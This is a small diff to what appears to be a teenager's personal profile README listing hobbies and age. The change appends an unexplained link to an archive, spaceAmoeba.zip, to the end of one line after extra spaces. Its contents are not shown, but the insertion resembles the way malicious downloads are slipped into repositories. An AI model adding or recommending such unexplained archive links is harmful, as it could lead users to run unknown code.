@@ -11,4 +11,5 @@
 * i like skiing
 * i like gaming
 * i am 14
-* i type at 35 wpm
+* i type at 35 wpm   [spaceAmoeba.zip](https://github.com/user-attachments/files/17906340/spaceAmoeba.zip)
+
